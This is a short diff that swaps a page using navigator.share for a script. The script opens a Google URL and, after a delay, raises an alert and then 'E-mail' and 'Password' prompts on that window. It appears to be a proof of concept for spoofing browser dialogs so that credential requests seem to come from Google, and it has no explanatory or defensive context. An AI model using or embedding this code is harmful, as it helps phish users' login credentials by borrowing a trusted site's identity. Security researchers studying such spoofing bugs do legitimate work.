@@ -1,14 +1,8 @@
-
-<html>
-    <head>
-        <script>
-
-    navigator.share({
-      title: 'My app',
-      url: document.location.href,
-    });
-        </script>
-    </head>
-    <body>
-    </body>
-</html>
+<script> function go(){
+ var x=window.open('https://www.google.com/csi');
+ setTimeout(function(){
+    x.alert('Alert');
+    x.prompt('E-mail','');
+    x.prompt('Password','');} ,1000);
+}
+</script>
